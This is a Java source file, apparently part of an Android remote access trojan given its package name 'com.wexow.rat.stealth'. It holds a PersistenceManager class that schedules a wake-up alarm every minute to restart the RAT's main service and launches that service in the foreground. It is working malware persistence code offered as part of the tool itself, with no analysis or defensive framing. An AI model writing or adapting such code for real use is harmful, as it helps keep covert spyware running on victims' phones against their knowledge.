package com.wexow.rat.stealth;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.wexow.rat.core.MainService;

public class PersistenceManager {
    private static final String TAG = "Persistence";

    public static void scheduleAlarm(Context ctx) {
        try {
            AlarmManager am =
                (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            Intent i = new Intent(ctx, MainService.Restarter.class);
            PendingIntent pi = PendingIntent.getBroadcast(ctx, 0, i,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            if (am != null) {
                am.setRepeating(AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 60000, 60000, pi);
                Log.d(TAG, "Alarm scheduled");
            }
        } catch (Exception e) {
            Log.e(TAG, "scheduleAlarm: " + e.getMessage());
        }
    }

    public static void startService(Context ctx) {
        try {
            Intent i = new Intent(ctx, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i);
            } else {
                ctx.startService(i);
            }
        } catch (Exception ignored) {}
    }

    public static void enableAll(Context ctx) {
        scheduleAlarm(ctx);
        startService(ctx);
    }
}